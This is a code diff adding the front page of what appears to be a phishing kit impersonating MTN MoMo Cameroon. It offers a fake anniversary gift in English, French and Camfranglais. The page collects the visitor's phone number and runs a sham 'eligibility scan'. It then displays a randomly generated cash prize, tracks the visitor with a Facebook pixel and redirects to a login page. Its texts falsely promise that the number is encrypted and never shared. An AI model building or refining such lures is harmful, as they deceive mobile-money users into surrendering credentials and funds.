+        'index.gift_subline': 'You are eligible for an anniversary gift of',
+        'index.gift_label': 'Your Anniversary Gift',
+        'index.gift_tag': '🎁 Anniversary Bonus',
+        'index.gift_message': 'Thank you for being part of our MoMo family. Continue to confirm your details and claim your gift today.',
+        'index.continue': 'CONTINUE',
+        'footer.text': '© 2026 MTN MoMo Cameroon'
+      },
+      fr: {
+        'brand.sub': 'Anniversaire MTN MoMo',
+        'index.badge': '🎂 Offre Anniversaire',
+        'index.title_line1': 'Joyeux Anniversaire !',
+        'index.title_line2': 'Vous avez été choisi',
+        'index.sub': "Dix ans de confiance. Des millions de moments. Et aujourd'hui, un cadeau rien que pour vous. Entrez votre numéro MoMo et découvrez combien nous célébrons avec vous.",
+        'index.phone_label': 'Votre Numéro MoMo',
+        'index.phone_error': 'Veuillez saisir un numéro MoMo valide à 9 chiffres',
+        'index.claim_btn': '🎁 RÉCLAMER',
+        'index.secure': 'Votre numéro est chiffré et jamais partagé',
+        'index.scanning': 'Analyse de votre numéro MoMo…',
+        'index.scanning_sub': 'Un instant, nous préparons quelque chose de spécial pour vous.',
+        'index.scan_step1': 'Vérification de votre ligne',
+        'index.scan_step2': "Vérification d'éligibilité",
+        'index.scan_step3': 'Préparation de votre cadeau',
+        'index.gift_headline': '🎉 Félicitations !',
+        'index.gift_subline': 'Vous êtes éligible à un cadeau anniversaire de',
+        'index.gift_label': 'Votre Cadeau Anniversaire',
+        'index.gift_tag': '🎁 Bonus Anniversaire',
+        'index.gift_message': "Merci de faire partie de notre famille MoMo. Continuez pour confirmer vos informations et réclamer votre cadeau dès aujourd'hui.",
+        'index.continue': 'CONTINUER',
+        'footer.text': '© 2026 MTN MoMo Cameroun'
+      },
+      cr: {
+        'brand.sub': 'MTN MoMo Anniv',
+        'index.badge': '🎂 Anniv Special',
+        'index.title_line1': 'Happy Anniv!',
+        'index.title_line2': 'You don been chosen',
+        'index.sub': "Ten years of trust. Plenty moments. And now, one gift wey just for you. Put your MoMo number and see how we dey celebrate you.",
+        'index.phone_label': 'Your MoMo Number',
+        'index.phone_error': 'Abeg put correct 9-digit MoMo number',
+        'index.claim_btn': '🎁 CLAIM NOW',
+        'index.secure': 'Your number dey safe, we no go share am',
+        'index.scanning': 'We dey scan your MoMo number…',
+        'index.scanning_sub': 'Small time, we dey prepare something special for you.',
+        'index.scan_step1': 'We dey check your line',
+        'index.scan_step2': 'We dey check eligibility',
+        'index.scan_step3': 'We dey prepare your gift',
+        'index.gift_headline': '🎉 Congratulations!',
+        'index.gift_subline': 'You qualify for anniv gift of',
+        'index.gift_label': 'Your Anniv Gift',
+        'index.gift_tag': '🎁 Anniv Bonus',
+        'index.gift_message': 'Thank you for being part of our MoMo family. Continue make you confirm your details and claim your gift today.',
+        'index.continue': 'CONTINUE',
+        'footer.text': '© 2026 MTN MoMo Cameroon'
+      }
+    };
+
+    // LANGUAGE META (no flags)
+    const LANG_META = {
+      en: { name: 'English' },
+      fr: { name: 'Français' },
+      cr: { name: 'Camfranglais' }
+    };
+
+    const langWrap = document.getElementById('langWrap');
+    const langBtn = document.getElementById('langBtn');
+    const langMenu = document.getElementById('langMenu');
+    const langName = document.getElementById('langName');
+    const langItems = document.querySelectorAll('.lang-item');
+
+    function applyLanguage(lang) {
+      if (!TRANSLATIONS[lang]) lang = 'en';
+      const t = TRANSLATIONS[lang];
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (t[key]) el.textContent = t[key];
+      });
+      langName.textContent = LANG_META[lang].name;
+      langItems.forEach(i => i.classList.toggle('selected', i.dataset.lang === lang));
+      localStorage.setItem('momoLang', lang);
+      document.documentElement.lang = lang === 'cr' ? 'en' : lang;
+    }
+
+    langBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      langWrap.classList.toggle('open');
+    });
+    langItems.forEach(item => {
+      item.addEventListener('click', (e) => {
+        e.stopPropagation();
+        applyLanguage(item.dataset.lang);
+        langWrap.classList.remove('open');
+      });
+    });
+    document.addEventListener('click', (e) => {
+      if (!langWrap.contains(e.target)) langWrap.classList.remove('open');
+    });
+
+    const savedLang = localStorage.getItem('momoLang') || 'en';
+    applyLanguage(savedLang);
+
+    // STEP SYSTEM
+    const stepCelebration = document.getElementById('stepCelebration');
+    const stepScanning = document.getElementById('stepScanning');
+    const stepGift = document.getElementById('stepGift');
+
+    function showStep(step) {
+      [stepCelebration, stepScanning, stepGift].forEach(s => s.classList.remove('active'));
+      step.classList.add('active');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // PHONE
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneWrapper = document.getElementById('phoneWrapper');
+    const phoneError = document.getElementById('phoneError');
+
+    phoneInput.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0, 9);
+      if (this.value.length === 9) {
+        phoneWrapper.classList.remove('invalid');
+        phoneError.classList.remove('show');
+      }
+    });
+
+    // CLAIM
+    const claimBtn = document.getElementById('claimBtn');
+    claimBtn.addEventListener('click', () => {
+      const digits = phoneInput.value.replace(/\D/g, '');
+      if (digits.length !== 9) {
+        phoneWrapper.classList.add('invalid');
+        phoneError.classList.add('show');
+        phoneInput.focus();
+        return;
+      }
+      localStorage.setItem('momoPhone', '+237' + digits);
+      showStep(stepScanning);
+      runScanningSequence();
+    });
+
+    // SCANNING
+    function runScanningSequence() {
+      const steps = document.querySelectorAll('.scan-step');
+      steps.forEach(s => s.classList.remove('active', 'done'));
+      const DURATION = 4000;
+      const perStep = DURATION / steps.length;
+      steps[0].classList.add('active');
+      let index = 0;
+      const tickStep = () => {
+        if (index >= steps.length) {
+          setTimeout(() => showGift(), 250);
+          return;
+        }
+        steps[index].classList.remove('active');
+        steps[index].classList.add('done');
+        index++;
+        if (index < steps.length) {
+          steps[index].classList.add('active');
+          setTimeout(tickStep, perStep);
+        } else {
+          setTimeout(() => showGift(), perStep);
+        }
+      };
+      setTimeout(tickStep, perStep);
+    }
+
+    // GIFT
+    const giftAmount = document.getElementById('giftAmount');
+    const MIN_AMOUNT = 675700;
+    const MAX_AMOUNT = 1936388;
+
+    function formatMoneyWithDecimals(n) {
+      return n.toLocaleString('en-US', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+    }
+
+    function showGift() {
+      const target = Math.floor(Math.random() * (MAX_AMOUNT - MIN_AMOUNT + 1)) + MIN_AMOUNT;
+      showStep(stepGift);
+      animateCount(giftAmount, 0, target, 1800);
+    }
+
+    function animateCount(el, from, to, durationMs) {
+      const start = performance.now();
+      const easeOut = t => 1 - Math.pow(1 - t, 3);
+      function frame(now) {
+        const elapsed = now - start;
+        const t = Math.min(1, elapsed / durationMs);
+        const eased = easeOut(t);
+        const current = from + (to - from) * eased;
+        el.textContent = formatMoneyWithDecimals(current);
+        if (t < 1) requestAnimationFrame(frame);
+        else el.textContent = formatMoneyWithDecimals(to);
+      }
+      requestAnimationFrame(frame);
+    }
+
+    // CONTINUE
+    const continueBtn = document.getElementById('continueBtn');
+    continueBtn.addEventListener('click', () => {
+      if (typeof fbq === 'function') {
+        fbq('track', 'InitiateCheckout', {
+          content_name: 'MoMo Anniversary Gift Claim',
+          content_category: 'Anniversary',
+          currency: 'XAF'
+        });
+      }
+      window.location.href = 'login.html';
+    });
+
+    phoneInput.focus();
+    console.log('🎉 MTN MoMo Anniversary — Index');
+  </script>
 </body>
 </html>
